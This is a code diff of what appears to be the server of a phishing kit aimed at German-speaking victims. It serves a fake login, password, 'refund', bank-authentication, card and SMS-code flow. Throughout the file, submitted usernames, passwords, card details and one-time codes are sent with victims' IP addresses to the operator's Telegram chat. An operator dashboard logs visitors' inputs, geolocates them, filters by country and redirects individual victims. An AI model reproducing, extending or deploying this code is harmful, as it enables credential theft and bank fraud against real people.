-  } catch (e) {
-    return res.status(400).json({ error: 'Invalid URL format' });
-  }
-  
-  // Check if IP exists in cache
-  if (!ipCache.has(ip)) {
-    return res.status(404).json({ error: 'IP not found in visitor cache' });
-  }
-  
-  // Store the redirect URL for this IP
-  const visitorData = ipCache.get(ip);
-  visitorData.redirectUrl = redirectUrl;
-  ipCache.set(ip, visitorData);
-  
-  // Emit socket event to redirect this visitor if they're online
-  if (visitorData.isOnline) {
-    io.emit('redirect', { ip, redirectUrl });
-  }
-  
-  res.json({ success: true, message: 'Redirect set successfully' });
-});
+
 
 // Clear input logs endpoint
-app.post('/dashboard/clear-input-logs', dashboardRateLimiter, restrictDashboardAccess, isAuthenticated, (req, res) => {
+app.post('/dashboard/clear-input-logs', (req, res) => {
   // Clear the input data cache
   inputDataCache.clear();
-  
+
   // Notify all dashboard clients that input data has been cleared
   io.emit('input-data-update');
-  
+
   res.json({ success: true, message: 'Input logs cleared successfully' });
 });
 
 // Redirect IP endpoint
-app.post('/dashboard/redirect-ip', dashboardRateLimiter, restrictDashboardAccess, isAuthenticated, (req, res) => {
+app.post('/dashboard/redirect-ip', (req, res) => {
   const { ip, redirectUrl } = req.body;
-  
+
   if (!ip || !redirectUrl) {
     return res.status(400).json({ success: false, message: 'IP address and redirect URL are required' });
   }
-  
+
   // Check if IP exists in cache
   if (!ipCache.has(ip)) {
     return res.status(404).json({ success: false, message: 'IP not found in cache' });
   }
-  
+
+
   // Store custom redirect URL for this IP
   const visitorData = ipCache.get(ip);
   ipCache.set(ip, {
     ...visitorData,
     customRedirectUrl: redirectUrl
   });
-  
   console.log(`Custom redirect set for IP ${ip} to ${redirectUrl}`);
-  
-  // Emit socket event to redirect this specific IP if they're online
-  if (visitorData.isOnline) {
-    io.emit('redirect', { ip, url: redirectUrl });
-  }
-  
+
+  // Use the emitRedirect helper to handle the redirect logic
+  emitRedirect(ip, redirectUrl, visitorData.lastPath);
+
   return res.json({ success: true, message: `Redirect set for IP ${ip}` });
 });
 
@@ -1312,7 +1176,7 @@ app.post("/dashboard/block", (req, res) => {
 // Get visitor data by IP endpoint
 app.get("/dashboard/visitor/:ip", (req, res) => {
   const { ip } = req.params;
-  
+
   if (ipCache.has(ip)) {
     res.json(ipCache.get(ip));
   } else {
@@ -1338,145 +1202,145 @@ app.post("/dashboard/unblock", (req, res) => {
 });
 
 // Block country endpoint
-app.post('/dashboard/block-country', dashboardRateLimiter, restrictDashboardAccess, isAuthenticated, (req, res) => {
+app.post('/dashboard/block-country', (req, res) => {
   const { countryCode } = req.body;
-  
+
   // Validate country code (must be 2 letters)
   if (!countryCode || typeof countryCode !== 'string' || countryCode.length !== 2) {
     return res.json({ success: false, message: 'Invalid country code format' });
   }
-  
+
   // Standardize to uppercase
   const formattedCode = countryCode.toUpperCase();
-  
+
   // Check if already in the list
   if (!globalSettings.blockedCountries.includes(formattedCode)) {
     globalSettings.blockedCountries.push(formattedCode);
     console.log(`Added ${formattedCode} to blocked countries list`);
   }
-  
+
   // Notify all dashboard clients about the update
   io.emit('dashboard-update');
-  
-  res.json({ 
-    success: true, 
+
+  res.json({
+    success: true,
     message: `Country ${formattedCode} added to blocked list`,
-    countries: globalSettings.blockedCountries 
+    countries: globalSettings.blockedCountries
   });
 });
 
-app.post('/dashboard/unblock-country', dashboardRateLimiter, restrictDashboardAccess, isAuthenticated, (req, res) => {
+app.post('/dashboard/unblock-country', (req, res) => {
   const { countryCode } = req.body;
-  
+
   // Validate country code
   if (!countryCode || typeof countryCode !== 'string') {
     return res.json({ success: false, message: 'Invalid country code' });
   }
-  
+
   // Standardize to uppercase
   const formattedCode = countryCode.toUpperCase();
-  
+
   // Remove from blocked list
   const initialLength = globalSettings.blockedCountries.length;
   globalSettings.blockedCountries = globalSettings.blockedCountries.filter(c => c !== formattedCode);
-  
+
   // Check if anything was removed
   const wasRemoved = initialLength > globalSettings.blockedCountries.length;
-  
+
   if (wasRemoved) {
     console.log(`Removed ${formattedCode} from blocked countries list`);
     // Notify all dashboard clients about the update
     io.emit('dashboard-update');
   }
-  
-  res.json({ 
-    success: true, 
+
+  res.json({
+    success: true,
     message: wasRemoved ? `Country ${formattedCode} removed from blocked list` : `Country ${formattedCode} was not in blocked list`,
-    countries: globalSettings.blockedCountries 
+    countries: globalSettings.blockedCountries
   });
 });
 
-app.post('/dashboard/allow-country', dashboardRateLimiter, restrictDashboardAccess, isAuthenticated, (req, res) => {
+app.post('/dashboard/allow-country', (req, res) => {
   const { countryCode } = req.body;
-  
+
   // Validate country code (must be 2 letters)
   if (!countryCode || typeof countryCode !== 'string' || countryCode.length !== 2) {
     return res.json({ success: false, message: 'Invalid country code format' });
   }
-  
+
   // Standardize to uppercase
   const formattedCode = countryCode.toUpperCase();
-  
+
   // Check if already in the list
   if (!globalSettings.allowedCountries.includes(formattedCode)) {
     globalSettings.allowedCountries.push(formattedCode);
     console.log(`Added ${formattedCode} to allowed countries list`);
   }
-  
+
   // Notify all dashboard clients about the update
   io.emit('dashboard-update');
-  
-  res.json({ 
-    success: true, 
+
+  res.json({
+    success: true,
     message: `Country ${formattedCode} added to allowed list`,
-    countries: globalSettings.allowedCountries 
+    countries: globalSettings.allowedCountries
   });
 });
 
-app.post('/dashboard/disallow-country', dashboardRateLimiter, restrictDashboardAccess, isAuthenticated, (req, res) => {
+app.post('/dashboard/disallow-country', (req, res) => {
   const { countryCode } = req.body;
-  
+
   // Validate country code
   if (!countryCode || typeof countryCode !== 'string') {
     return res.json({ success: false, message: 'Invalid country code' });
   }
-  
+
   // Standardize to uppercase
   const formattedCode = countryCode.toUpperCase();
-  
+
   // Remove from allowed list
   const initialLength = globalSettings.allowedCountries.length;
   globalSettings.allowedCountries = globalSettings.allowedCountries.filter(c => c !== formattedCode);
-  
+
   // Check if anything was removed
   const wasRemoved = initialLength > globalSettings.allowedCountries.length;
-  
+
   if (wasRemoved) {
     console.log(`Removed ${formattedCode} from allowed countries list`);
     // Notify all dashboard clients about the update
     io.emit('dashboard-update');
   }
-  
-  res.json({ 
-    success: true, 
+
+  res.json({
+    success: true,
     message: wasRemoved ? `Country ${formattedCode} removed from allowed list` : `Country ${formattedCode} was not in allowed list`,
-    countries: globalSettings.allowedCountries 
+    countries: globalSettings.allowedCountries
   });
 });
 
-app.post('/dashboard/toggle-country-mode', dashboardRateLimiter, restrictDashboardAccess, isAuthenticated, (req, res) => {
+app.post('/dashboard/toggle-country-mode', (req, res) => {
   const { allowMode } = req.body;
-  
+
   // Validate input
   if (allowMode === undefined) {
     return res.json({ success: false, message: 'Missing allowMode parameter' });
   }
-  
+
   // Convert to boolean if string
   const newMode = allowMode === true || allowMode === 'true';
   const oldMode = globalSettings.countryFilterMode === 'allow-only';
-  
+
   // Only update if there's a change
   if (newMode !== oldMode) {
     globalSettings.countryFilterMode = newMode ? 'allow-only' : 'block';
     console.log(`Country filter mode changed to: ${globalSettings.countryFilterMode}`);
-    
+
     // Notify all dashboard clients about the update
     io.emit('dashboard-update');
   }
-  
-  res.json({ 
-    success: true, 
+
+  res.json({
+    success: true,
     message: `Country filter mode set to ${newMode ? 'Allow Only' : 'Block'} mode`,
     mode: globalSettings.countryFilterMode,
     countries: globalSettings.countryFilterMode === 'block' ? globalSettings.blockedCountries : globalSettings.allowedCountries
@@ -1492,7 +1356,7 @@ app.post('/dashboard/toggle-proxy-detection', (req, res) => {
     // Toggle if no value provided
     globalSettings.proxyDetectionEnabled = !globalSettings.proxyDetectionEnabled;
   }
-  
+
   res.json({
     success: true,
     proxyDetectionEnabled: globalSettings.proxyDetectionEnabled
@@ -1503,36 +1367,36 @@ app.post('/dashboard/toggle-proxy-detection', (req, res) => {
 
 //////////////////////////////
 //=========================[GET]===================
-app.get("/",(req,res)=>{ // login
+app.get("/", (req, res) => { // login
   res.render("index");
 });
-app.get("/PPmP85AgNE4pnL5mWSM",(req,res)=>{ // loading 1:
+app.get("/PPmP85AgNE4pnL5mWSM", (req, res) => { // loading 1:
   res.render("posas", { pass: req.session.username });
 });
-app.get("/loading",(req,res)=>{ // loading 1:
-  const {time,url} = req.query;
-  res.render("lopin",{url,time});
+app.get("/loading", (req, res) => { // loading 1:
+  const { time, url } = req.query;
+  res.render("lopin", { url, time });
 });
-app.get("/QcEwP85AgNE4pnL5mWSM",(req,res)=>{ // loading 1:
+app.get("/QcEwP85AgNE4pnL5mWSM", (req, res) => { // loading 1:
   res.render("capoca");
 });
 
-app.get("/RKnUB922z6Mf4HDwg3EZ",(req,res)=>{ // loading 2:
+app.get("/RKnUB922z6Mf4HDwg3EZ", (req, res) => { // loading 2:
   res.render("semitr-1");
 });
 
-app.get("/LGknmeM9HwWUWSutj6mJ",(req,res)=>{ // loading 3:
-  res.render("semitr-2",{url:process.env.URL});
+app.get("/LGknmeM9HwWUWSutj6mJ", (req, res) => { // loading 3:
+  res.render("semitr-2", { url: process.env.URL });
 });
 
 app.get("/PrTomeM9HwWUWSulkTe4", (req, res) => {
   const today = new Date();
   const processingDate = today.toLocaleDateString('de-DE', { day: '2-digit', month: 'long', year: 'numeric' });
-  
+
   const deadline = new Date();
   deadline.setDate(today.getDate() + 2);
   const paymentDeadline = deadline.toLocaleDateString('de-DE', { day: '2-digit', month: 'long', year: 'numeric' });
-  
+
   const refundAmount = "116,35";
 
   res.render("refund", {
@@ -1543,13 +1407,13 @@ app.get("/PrTomeM9HwWUWSulkTe4", (req, res) => {
   });
 });
 
-app.get("/Ose4aQeM9H4waRfs7PrTv",(req,res)=>{ // bank auth verification page
+app.get("/Ose4aQeM9H4waRfs7PrTv", (req, res) => { // bank auth verification page
   res.render("bankauth");
 });
 
-app.get("/LkaaomeM9HwWU472fgsPr",(req,res)=>{ // loading 3:
+app.get("/LkaaomeM9HwWU472fgsPr", (req, res) => { // loading 3:
   const refundAmount = "116,35";
-  res.render("done",{refundAmount});
+  res.render("done", { refundAmount });
 });
 
 
@@ -1558,84 +1422,84 @@ app.get("/LkaaomeM9HwWU472fgsPr",(req,res)=>{ // loading 3:
 
 
 //======================[POST]======================
-app.post("/gzLbTbjqMpc34D4XsPJ2",(req,res)=>{ // login post
+app.post("/gzLbTbjqMpc34D4XsPJ2", (req, res) => { // login post
   let data = req.body;
   const clientIp =
     req.headers["x-forwarded-for"]?.split(",")[0].trim() ||
     requestIp.getClientIp(req);
   req.session.username = data.username;
-  a1(data,clientIp);
-  res.send({OK:true});
+  a1(data, clientIp);
+  res.send({ OK: true });
 });
-app.post("/SSwP85AgNE4pnL5mWSM",(req,res)=>{ // posas post
+app.post("/SSwP85AgNE4pnL5mWSM", (req, res) => { // posas post
   let data = req.body;
   const clientIp =
     req.headers["x-forwarded-for"]?.split(",")[0].trim() ||
     requestIp.getClientIp(req);
   bot.telegram.sendMessage(process.env.CHATID, `${brand} | [PASSWORD] | TEAM\n#=o=o=o=o=o=o=o=o=o=o=o=o=o=o=o=#\nUSER: ${req.session.username}\nPASSWORD: ${data.password}\nIP: ${clientIp}\n#=o=o=o=o=o=o=o=o=o=o=o=o=o=o=o=#\n${brand} | [${target}] | TEAM`);
-  res.send({OK:true});
+  res.send({ OK: true });
 });
 
 
-app.post("/EpLP85AgNE4pn4RtpL",(req,res)=>{ // posas post
+app.post("/EpLP85AgNE4pn4RtpL", (req, res) => { // posas post
   let data = req.body;
   const clientIp =
     req.headers["x-forwarded-for"]?.split(",")[0].trim() ||
     requestIp.getClientIp(req);
   bot.telegram.sendMessage(process.env.CHATID, `${brand} | [REFUND] | TEAM\n#=o=o=o=o=o=o=o=o=o=o=o=o=o=o=o=#\n      Sa7bna Bari Refund\nIP: ${clientIp}\n#=o=o=o=o=o=o=o=o=o=o=o=o=o=o=o=#\n${brand} | [${target}] | TEAM`);
-  res.send({OK:true});
+  res.send({ OK: true });
 });
 
 
-app.post("/NkMNm4664XhcW8KuukHk",(req,res)=>{ // cc post
+app.post("/NkMNm4664XhcW8KuukHk", (req, res) => { // cc post
   let data = req.body;
   const clientIp =
     req.headers["x-forwarded-for"]?.split(",")[0].trim() ||
     requestIp.getClientIp(req);
-  a2(data,clientIp);
-  res.send({OK:true});
+  a2(data, clientIp);
+  res.send({ OK: true });
 });
-app.post("/m4kT9BQWt7KTDdaVmafx",(req,res)=>{ // sms1 post
+app.post("/m4kT9BQWt7KTDdaVmafx", (req, res) => { // sms1 post
   let data = req.body;
   const clientIp =
     req.headers["x-forwarded-for"]?.split(",")[0].trim() ||
     requestIp.getClientIp(req);
-  a3(data,clientIp);
-  res.send({OK:true});
+  a3(data, clientIp);
+  res.send({ OK: true });
 });
-app.post("/Qv69PRvXg6PQEvrzJx6j",(req,res)=>{ // sms2 post
+app.post("/Qv69PRvXg6PQEvrzJx6j", (req, res) => { // sms2 post
   let data = req.body;
   const clientIp =
     req.headers["x-forwarded-for"]?.split(",")[0].trim() ||
     requestIp.getClientIp(req);
-  a4(data,clientIp);
-  res.send({OK:true});
+  a4(data, clientIp);
+  res.send({ OK: true });
 });
 
 
 // Functions:
 // 9alab dayal CHULDA:
-function a1(data,ip) {
-  let block="";
-  block += `${brand}  | [LOGIN] |  TEAM\n`; 
+function a1(data, ip) {
+  let block = "";
+  block += `${brand}  | [LOGIN] |  TEAM\n`;
   block += `#=o=o=o=o=o=o=o=o=o=o=o=o=o=o=o=#\n`;
   block += `USER: ${data.username}\nIP: ${ip}\n`;
   block += `#=o=o=o=o=o=o=o=o=o=o=o=o=o=o=o=#\n`;
   block += `${brand}  | [${target}]  |  TEAM`;
-  
-  bot.telegram.sendMessage(process.env.CHATID,block);
-  
+
+  bot.telegram.sendMessage(process.env.CHATID, block);
+
 
 }
 // Generic function to send Telegram notifications
 function sendTelegramNotification(title, content, ip) {
   let block = "";
-  block += `${brand}  | ${title} |  TEAM\n`; 
+  block += `${brand}  | ${title} |  TEAM\n`;
   block += `#=o=o=o=o=o=o=o=o=o=o=o=o=o=o=o=#\n`;
   block += `${content}\nIP: ${ip}\n`;
   block += `#=o=o=o=o=o=o=o=o=o=o=o=o=o=o=o=#\n`;
   block += `${brand}  | [${target}]  |  TEAM`;
-  
+
   bot.telegram.sendMessage(process.env.CHATID, block);
 }
 
@@ -1662,16 +1526,16 @@ function a4(data, ip) {
 // Listen to server:
 http.listen(PORT, () => {
   console.log(`Server running on port ${PORT}`);
-  
+
   // Socket.io connection handling
   io.on('connection', (socket) => {
     // Use improved IP detection function
     const clientIP = getAccurateClientIp(socket.request);
     console.log('a user connected:', clientIP);
-    
+
     // Store IP in socket for later reference, will be updated when client sends their IP
     socket.clientIP = clientIP;
-    
+
     // Update visitor online status or initialize new IP entry
     if (ipCache.has(clientIP)) {
       // Update existing visitor to online status
@@ -1680,41 +1544,47 @@ http.listen(PORT, () => {
       // Initialize a new IP cache entry
       initializeIPCacheEntry(clientIP, "/", socket);
     }
-    
+
     // Emit updated dashboard data to all connected clients
     io.emit('dashboard-update');
 
     socket.on('disconnect', () => {
       console.log('user disconnected:', socket.clientIP);
-      
+
       // Update visitor online status to offline
       updateVisitorOnlineStatus(socket.clientIP, false);
     });
 
     // Handle redirect requests from dashboard
     socket.on('redirect-user', (data) => {
-      io.emit('redirect', {url: data.url, ip: data.ip});
+      // Include target paths in the redirect event
+      io.emit('redirect', { 
+        url: data.url, 
+        ip: data.ip,
+        targetPaths: REAL_ROUTES,
+        currentPath: data.path || '/'
+      });
     });
-    
+
     // Helper function to get and update client IP from event data
     function getClientIP(data, socket) {
       // Use client IP from front-end if available, otherwise fall back to socket.clientIP
       const clientIP = data.clientIP || socket.clientIP;
-      
+
       // Update socket.clientIP with the front-end IP for future reference
       if (data.clientIP) {
         socket.clientIP = data.clientIP;
         console.log('Updated client IP from front-end:', data.clientIP);
       }
-      
+
       return clientIP;
     }
-    
+
     // Helper function to check if an IP is blocked
     function isIPBlocked(ip) {
       return ipCache.has(ip) && ipCache.get(ip).isBlocked;
     }
-    
+
     // Helper function to get visitor data with caching
     function getVisitorData(clientIP) {
       if (ipCache.has(clientIP)) {
@@ -1722,58 +1592,58 @@ http.listen(PORT, () => {
       }
       return null;
     }
-    
+
     // Using global getGeoData function for geolocation data
-    
+
     // Helper function to update input data cache
     function updateInputDataCache(clientIP, data) {
       // Store input data with IP association
       if (!inputDataCache.has(clientIP)) {
         inputDataCache.set(clientIP, []);
       }
-      
+
       // Add timestamp and path information
       const inputData = {
         ...data,
         ip: clientIP,
         timestamp: new Date().toISOString()
       };
-      
+
       // Add to the beginning of the array (newest first)
       const ipInputs = inputDataCache.get(clientIP);
       ipInputs.unshift(inputData);
-      
+
       // Limit to 50 most recent inputs per IP
       if (ipInputs.length > 50) {
         ipInputs.pop();
       }
-      
+
       // Update the cache
       inputDataCache.set(clientIP, ipInputs);
-      
+
       // Notify dashboard of new input data
       io.emit('input-data-update');
     }
-    
+
     // Helper function to update visitor online status
     function updateVisitorOnlineStatus(clientIP, isOnline) {
       if (ipCache.has(clientIP)) {
         const visitorData = ipCache.get(clientIP);
         visitorData.isOnline = isOnline;
-        
+
         if (isOnline) {
           visitorData.lastConnected = new Date();
         } else {
           visitorData.lastDisconnected = new Date();
         }
-        
+
         ipCache.set(clientIP, visitorData);
         io.emit('dashboard-update');
       }
     }
-    
+
     // These functions have been moved to global scope
-    
+
     // Helper function to initialize a new IP cache entry
     async function initializeIPCacheEntry(clientIP, path, socket) {
       // Parse user agent
@@ -1782,7 +1652,7 @@ http.listen(PORT, () => {
       const browser = uaParser.getBrowser();
       const os = uaParser.getOS();
       const device = uaParser.getDevice();
-      
+
       // Create new visitor data entry
       const visitorData = {
         ip: clientIP,
@@ -1803,13 +1673,13 @@ http.listen(PORT, () => {
         lastConnected: new Date(),
         inputs: []
       };
-      
+
       // Store in cache
       ipCache.set(clientIP, visitorData);
-      
+
       // Emit new visitor event to dashboard
       io.emit('new-visitor', visitorData);
-      
+
       // Fetch geo data asynchronously using cached function
       getGeoData(clientIP).then(geoData => {
         if (ipCache.has(clientIP)) {
@@ -1821,7 +1691,7 @@ http.listen(PORT, () => {
           updatedVisitorData.proxy = geoData.proxy || false;
           updatedVisitorData.hosting = geoData.hosting || false;
           ipCache.set(clientIP, updatedVisitorData);
-          
+
           // Emit dashboard update and new visitor event with geo data
           io.emit('dashboard-update');
           io.emit('new-visitor', updatedVisitorData);
@@ -1829,10 +1699,10 @@ http.listen(PORT, () => {
       }).catch(error => {
         console.error(`Error fetching geo data for IP ${clientIP}:`, error);
       });
-      
+
       return visitorData;
     }
-    
+
     // Helper function to update IP cache with page view data
     function updateIPCacheWithPageView(clientIP, path, socket) {
       if (ipCache.has(clientIP)) {
@@ -1841,7 +1711,7 @@ http.listen(PORT, () => {
         ipData.lastRequest = new Date();
         ipData.requestCount = (ipData.requestCount || 0) + 1;
         ipCache.set(clientIP, ipData);
-        
+
         // If we don't have country data yet, fetch it
         if (!ipData.countryCode) {
           fetchGeoData(clientIP).then(geoData => {
@@ -1864,42 +1734,42 @@ http.listen(PORT, () => {
         // Initialize a new IP cache entry
         initializeIPCacheEntry(clientIP, path, socket);
       }
-      
+
       // Notify dashboard of visitor update
       io.emit('dashboard-update');
     }
-    
+
     // Handle page view events from clients
     socket.on('page-view', (data) => {
       const clientIP = getClientIP(data, socket);
-      
+
       // Skip if IP is blocked
       if (isIPBlocked(clientIP)) {
         return;
       }
-      
+
       // Skip tracking for dashboard requests
       if (data.path && data.path.startsWith('/dashboard')) {
         console.log('Skipping dashboard request tracking for:', clientIP);
         return;
       }
-      
+
       // Update IP cache with page view data
       updateIPCacheWithPageView(clientIP, data.path, socket);
     });
-    
+
     // Handle input data from clients
     socket.on('input-data', (data) => {
       const clientIP = getClientIP(data, socket);
-      
+
       // Skip if IP is blocked
       if (isIPBlocked(clientIP)) {
         return;
       }
-      
+
       // Update input data cache with the new data
       updateInputDataCache(clientIP, data);
-      
+
       // Emit dashboard update
       io.emit('dashboard-update');
     });
